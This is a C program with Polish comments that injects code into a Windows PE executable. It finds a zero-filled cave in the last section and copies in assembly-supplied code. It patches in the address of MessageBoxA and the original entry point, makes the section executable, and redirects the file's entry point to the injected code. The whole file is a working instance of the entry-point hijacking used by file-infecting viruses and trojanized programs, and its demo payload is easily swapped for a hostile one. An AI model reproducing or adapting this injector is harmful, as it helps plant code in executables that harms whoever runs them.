#include <windows.h>
#include <stdio.h>
#include <winnt.h>
#include <stdlib.h>

extern DWORD get_size();

extern DWORD get_adr();

PIMAGE_DOS_HEADER GetDosHeader(LPBYTE file) {
	return (PIMAGE_DOS_HEADER)file;
}

/*
 Zwraca Header PE
*/
PIMAGE_NT_HEADERS GetPeHeader(LPBYTE file) {
	PIMAGE_DOS_HEADER pidh = GetDosHeader(file);

	return (PIMAGE_NT_HEADERS)((DWORD)pidh + pidh->e_lfanew);
}

/*
 Zwraca Header pliku
*/
PIMAGE_FILE_HEADER GetFileHeader(LPBYTE file) {
	PIMAGE_NT_HEADERS pinh = GetPeHeader(file);

	return (PIMAGE_FILE_HEADER)&pinh->FileHeader;
}

/*
* Zwraca optional Header
*/
PIMAGE_OPTIONAL_HEADER GetOptionalHeader(LPBYTE file) {
	PIMAGE_NT_HEADERS pinh = GetPeHeader(file);

	return (PIMAGE_OPTIONAL_HEADER)&pinh->OptionalHeader;
}

/*
 Zwraca pierwsza sekcje pliku PE (sekcje .code lub .text)
*/
PIMAGE_SECTION_HEADER GetFirstSectionHeader(LPBYTE file) {
	PIMAGE_NT_HEADERS pinh = GetPeHeader(file);

	return (PIMAGE_SECTION_HEADER)IMAGE_FIRST_SECTION(pinh);
}

/*
 Zwraca ostatnia sekcje pliku PE
*/
PIMAGE_SECTION_HEADER GetLastSectionHeader(LPBYTE file) {
	return (PIMAGE_SECTION_HEADER)(GetFirstSectionHeader(file) + (GetPeHeader(file)->FileHeader.NumberOfSections - 1));
}

BOOL VerifyDOS(PIMAGE_DOS_HEADER pidh) {
	return pidh->e_magic == IMAGE_DOS_SIGNATURE ? TRUE : FALSE;
}

BOOL VerifyPE(PIMAGE_NT_HEADERS pinh) {
	return pinh->Signature == IMAGE_NT_SIGNATURE ? TRUE : FALSE;
}


int main(int argc, char* argv[])
{
	HANDLE hPlik = CreateFile(L"pefile.exe", FILE_READ_ACCESS | FILE_WRITE_ACCESS,
		0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); //Wczytanie pliku .exe
	if (hPlik == INVALID_HANDLE_VALUE)
	{
		printf("[-] Nie udalo sie otworzyc %s\n", "pefile.exe");
		return 0;
	}

	//Sprawdzenie wielkosci pliku PE
	DWORD rozmiar_pliku = GetFileSize(hPlik, NULL); 
	//Mapowanie pliku do pamieci programu w celu operacji na nim
	HANDLE hMapping = CreateFileMapping(hPlik, NULL, PAGE_READWRITE, 0, rozmiar_pliku, NULL);
	LPBYTE lpFile = (LPBYTE)MapViewOfFile(hMapping, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, rozmiar_pliku);

	//Czy plik jest poprawny
	if (VerifyDOS(GetDosHeader(lpFile)) == FALSE ||
		VerifyPE(GetPeHeader(lpFile)) == FALSE) {
		fprintf(stderr, "Not a valid PE file\n");
		return 1;
	}

	//Odczytanie informacji o naglowkach pliku 
	PIMAGE_NT_HEADERS pinh = GetPeHeader(lpFile);
	PIMAGE_SECTION_HEADER pish = GetLastSectionHeader(lpFile);

	//Ustalenie adresu od ktorego rozpocznie sie wykonywanie pliku PE
	DWORD dwOEP = pinh->OptionalHeader.AddressOfEntryPoint +
		pinh->OptionalHeader.ImageBase;

	//Za pomoca funkcji z assemblera obliczenie wielkosci kodu, ktory chcemy dokleic do plku
	DWORD rozmiar_kodu = get_size(); 

	DWORD licznik = 0, pozycja = 0;
	//szukanie wolnego miejsca na umieszczenie naszego kodu
	for (pozycja = pish->PointerToRawData; pozycja < rozmiar_pliku; pozycja++) {
		if (*(lpFile + pozycja) == 0x00) { //jesli znalezlismy puste miejsce(czyli 0x00), zliczamy je
			if (licznik++ == rozmiar_kodu) { //zwieksz licznik, jesli ilosc pustych miejsc jest rowna wielkosci naszego kodu
				pozycja -= rozmiar_kodu; //zapamietujemy miejsce w ktorym wsadzimy nasz kod
				break;
			}
		}
		else {
			licznik = 0; //jesli blok wolnego miejsca jest za maly to resetujemy licznik
		}
	}

	//jesli nie udalo sie znalesc miejsca na nasz kod
	if (licznik == 0 || pozycja == 0) {
		printf("Nie znaleziono odpowiedniego miejsca na kod");
		return 1;
	}

	//dynamiczne pozyskanie biblioteki
	HMODULE hModule = LoadLibrary(L"User32.dll");
	//Pozyskanie adresu funkcji MessageBoxA z User32.dll
	LPVOID AdresMessageBoxA = (DWORD)GetProcAddress(hModule, "MessageBoxA");

	//stworzenie sterty w celu przechowania kodu w pamieci
	HANDLE hSterta = HeapCreate(0, 0, rozmiar_kodu);
	//zarezerowanie pamieci dla sterty
	LPVOID buffor_z_kodem = HeapAlloc(hSterta, HEAP_ZERO_MEMORY, rozmiar_kodu);

	//wczytanie do pamieci naszego kodu funkcja get_adr, ktora zwraca adres poczatku naszego kodu
	memcpy(buffor_z_kodem, get_adr(), rozmiar_kodu);


	//wykrycie markerow w kodzie i wstawienie w ich miejsce adresu funkcji MessageBoxA
	licznik = 0;
	DWORD adres_markera, tmp;
	while (licznik < rozmiar_kodu)
	{
		if (*((LPBYTE)buffor_z_kodem + licznik) == 0xAA) { //marker znaleziony
			//wstawienie w miejsce markera adresu MessageBoxA
			adres_markera = ((LPBYTE)buffor_z_kodem + licznik); 
			memcpy(adres_markera, &AdresMessageBoxA, 4); 
			FreeLibrary(hModule);
			break;
		}
		licznik++;
	}

	//Dodanie adresu poczatkowego pliku PE, aby po wykonaniu naszego kodu wykonala sie pierwotna czesc pliku
	licznik = 0;
	while (licznik < rozmiar_kodu)
	{
		if (*((LPBYTE)buffor_z_kodem + licznik) == 0xAA) {
			//wstawienie w miejsce markera adresu Original Entry Point tj. adresu poczatkowego pliku PE
			adres_markera = ((LPBYTE)buffor_z_kodem + licznik);
			memcpy(adres_markera, &dwOEP, 4);
			break;
		}
		licznik++;
	}

	//Skopiowanie kodu ze sterty do pliku
	memcpy((LPBYTE)(lpFile + pozycja), buffor_z_kodem, rozmiar_kodu);
	HeapFree(hSterta, 0, buffor_z_kodem);
	HeapDestroy(hSterta);

	//Aktualizacja rozmiaru pliku PE
	pish->Misc.VirtualSize += rozmiar_kodu;

	//Zrobienie sekcji mozliwa do uruchomienia (executable)
	pish->Characteristics |= IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE;

	//Ustawienie nowego adresu rozpoczecia pliku (Address of Entry Point)
	// RVA = file offset + virtual offset - raw offset
	pinh->OptionalHeader.AddressOfEntryPoint = pozycja + pish->VirtualAddress - pish->PointerToRawData;
	printf("Plik poprawnie zmodyfikowany");
	return 0;
}